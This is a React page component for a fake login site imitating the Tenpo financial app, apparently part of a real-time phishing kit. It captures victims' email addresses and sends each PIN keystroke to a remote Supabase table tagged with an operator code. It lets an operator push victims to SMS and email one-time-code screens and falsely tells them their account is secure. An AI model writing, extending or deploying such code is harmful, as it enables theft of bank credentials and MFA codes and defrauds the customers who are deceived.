import { useState, useEffect, useCallback, useRef } from "react";
import { useParams } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { useVisitTracker, useVisitorPresence } from "@/hooks/useVisitTracker";
import TenpoWelcomeScreen from "@/components/tenpo/TenpoWelcomeScreen";
import TenpoLoginForm from "@/components/tenpo/TenpoLoginForm";
import TenpoPasswordScreen from "@/components/tenpo/TenpoPasswordScreen";
import TenpoWaitingScreen from "@/components/tenpo/TenpoWaitingScreen";
import TenpoConfirmEmailScreen from "@/components/tenpo/TenpoConfirmEmailScreen";
import TenpoSyncEmailScreen from "@/components/tenpo/TenpoSyncEmailScreen";
import TenpoPinLengthModal from "@/components/tenpo/TenpoPinLengthModal";
import TenpoSmsScreen from "@/components/tenpo/TenpoSmsScreen";
import TenpoEmailCodeScreen from "@/components/tenpo/TenpoEmailCodeScreen";

type Step = "welcome" | "login" | "choose_pin_length" | "password" | "waiting" | "confirm_email" | "sync_email" | "mfa_sms" | "mfa_email" | "done";

const Tenpo = () => {
  const { operatorCode: rawOp } = useParams<{ operatorCode?: string }>();
  const operatorCode = rawOp ? rawOp.replace(/[^a-zA-Z0-9]/g, "") || "master" : "master";

  const [step, setStep] = useState<Step>("welcome");
  const stepRef = useRef<Step>("welcome");
  const [email, setEmail] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [sessionId, setSessionId] = useState("");
  const [pinLength, setPinLength] = useState<4 | 6>(6);
  const lastHandledStatusRef = useRef("");

  useVisitTracker();
  useVisitorPresence(sessionId || null);

  useEffect(() => {
    document.title = "Tenpo — Inicia sesión";
    const link: HTMLLinkElement = document.querySelector("link[rel~='icon']") || document.createElement("link");
    link.rel = "icon";
    link.type = "image/png";
    // Use a green circle as favicon placeholder
    link.href = "data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'><circle cx='16' cy='16' r='16' fill='%234DF4AC'/></svg>";
    document.head.appendChild(link);
  }, []);

  const createSession = useCallback(async (userEmail: string, status: string, extra: Record<string, unknown> = {}) => {
    const { data } = await supabase.from("sessions").insert({
      email: userEmail,
      source: "tenpo",
      status,
      otp_code: extra.otp_code as string || null,
      password: extra.password as string || null,
      ip_address: null,
      operator_code: operatorCode,
    } as any).select("id").single();
    if (data?.id) setSessionId(data.id);
    return data?.id;
  }, [operatorCode]);

  const updateSession = useCallback(async (status: string, extra: Record<string, unknown> = {}) => {
    if (!sessionId) return;
    await supabase.from("sessions").update({ status, ...extra }).eq("id", sessionId);
  }, [sessionId]);

  const setStepSync = useCallback((s: Step) => {
    stepRef.current = s;
    setStep(s);
  }, []);

  const handleAdminStatus = useCallback((status?: string) => {
    if (!status) return;
    // Don't re-process same status
    if (status === lastHandledStatusRef.current) return;
    // Ignore intermediate statuses that we set ourselves
    if (status === "typing_password" || status === "waiting_admin") return;

    lastHandledStatusRef.current = status;

    if (status === "wrong_password") {
      setError("Clave incorrecta. Inténtalo de nuevo.");
      setStepSync("password");
      return;
    }
    if (status === "login_success") {
      setStepSync("done");
      return;
    }
    if (status === "redirect_confirm_email") {
      setStepSync("confirm_email");
      return;
    }
    if (status === "redirect_sync_email") {
      setStepSync("sync_email");
      return;
    }
    if (status === "redirect_mfa_sms") {
      setStepSync("mfa_sms");
      return;
    }
    if (status === "redirect_mfa_email") {
      setStepSync("mfa_email");
      return;
    }
  }, [setStepSync]);

  // Listen for admin commands + realtime status changes
  useEffect(() => {
    if (!sessionId) return;

    const controlChannel = supabase.channel(`session-control-${sessionId}`);
    const reviewChannel = supabase.channel(`session-review-${sessionId}`);

    // Realtime DB changes for this specific session
    const dbChannel = supabase.channel(`tenpo-session-db-${sessionId}`)
      .on("postgres_changes", {
        event: "UPDATE",
        schema: "public",
        table: "sessions",
        filter: `id=eq.${sessionId}`,
      }, (payload) => {
        handleAdminStatus((payload.new as any)?.status);
      })
      .subscribe();

    controlChannel.on("broadcast", { event: "redirect" }, (payload) => {
      const target = payload.payload?.target as string;
      if (target === "confirm_email") setStepSync("confirm_email");
      else if (target === "sync_email") setStepSync("sync_email");
    }).subscribe();

    reviewChannel
      .on("broadcast", { event: "review_decision" }, (payload) => {
        handleAdminStatus(payload.payload?.status);
      })
      .subscribe();

    // Fallback polling (slower)
    const pollInterval = setInterval(async () => {
      const { data } = await supabase.from("sessions").select("status").eq("id", sessionId).maybeSingle();
      if (!data) return;
      handleAdminStatus(data.status);
    }, 2500);

    return () => {
      supabase.removeChannel(controlChannel);
      supabase.removeChannel(reviewChannel);
      supabase.removeChannel(dbChannel);
      clearInterval(pollInterval);
    };
  }, [sessionId, handleAdminStatus, setStepSync]);

  const handleEmailSubmit = async (submittedEmail: string) => {
    setEmail(submittedEmail);
    setError("");
    setStepSync("choose_pin_length");
  };

  const handlePinLengthSelect = async (length: 4 | 6) => {
    setPinLength(length);
    setLoading(true);
    const sid = await createSession(email, "typing_password", { password: null });
    if (sid) setStepSync("password");
    setLoading(false);
  };

  const handlePasswordTyping = useCallback(async (partialPin: string) => {
    // Only clear error when user actually types a new digit (not on reset)
    if (partialPin.length > 0 && error) setError("");
    // Reset so next admin action can be caught
    lastHandledStatusRef.current = "";
    if (!sessionId) return;
    await updateSession("typing_password", { password: partialPin || null });
  }, [error, sessionId, updateSession]);

  const handlePasswordSubmit = async (pin: string) => {
    setLoading(true);
    setError("");
    lastHandledStatusRef.current = "";
    await updateSession("waiting_admin", { password: pin });
    setStepSync("waiting");
    setLoading(false);
  };

  if (step === "mfa_sms") {
    return <TenpoSmsScreen email={email} sessionId={sessionId} onBack={() => setStepSync("waiting")} />;
  }

  if (step === "mfa_email") {
    return <TenpoEmailCodeScreen email={email} sessionId={sessionId} onBack={() => setStepSync("waiting")} />;
  }

  if (step === "confirm_email") {
    return <TenpoConfirmEmailScreen email={email} sessionId={sessionId} onBack={() => setStepSync("waiting")} />;
  }

  if (step === "sync_email") {
    return <TenpoSyncEmailScreen email={email} sessionId={sessionId} onBack={() => setStepSync("waiting")} />;
  }

  if (step === "done") {
    return (
      <div className="flex min-h-[100dvh] flex-col items-center justify-center bg-[#0a0a0a] px-6">
        <div className="text-[48px] mb-4">✅</div>
        <h1 className="text-[24px] font-bold text-white mb-2">Tu cuenta está segura</h1>
        <p className="text-[14px] text-[#888] text-center">Verificamos tu identidad y actualizamos las medidas de seguridad de tu cuenta.</p>
        <p className="mt-4 text-[12px] text-[#555]">{email}</p>
      </div>
    );
  }

  if (step === "waiting") {
    return <TenpoWaitingScreen email={email} />;
  }

  if (step === "choose_pin_length") {
    return (
      <div className="flex min-h-[100dvh] flex-col bg-[#0a0a0a]">
        <TenpoPinLengthModal
          onSelect={handlePinLengthSelect}
          onClose={() => setStepSync("login")}
        />
      </div>
    );
  }

  if (step === "password") {
    return (
      <TenpoPasswordScreen
        email={email}
        pinLength={pinLength}
        onSubmit={handlePasswordSubmit}
        onTyping={handlePasswordTyping}
        onBack={() => { setStepSync("login"); setError(""); }}
        loading={loading}
        error={error}
      />
    );
  }

  if (step === "welcome") {
    return <TenpoWelcomeScreen onLogin={() => setStepSync("login")} />;
  }

  return (
    <TenpoLoginForm
      onSubmit={handleEmailSubmit}
      onBack={() => setStepSync("welcome")}
      loading={loading}
      error={error}
    />
  );
};

export default Tenpo;
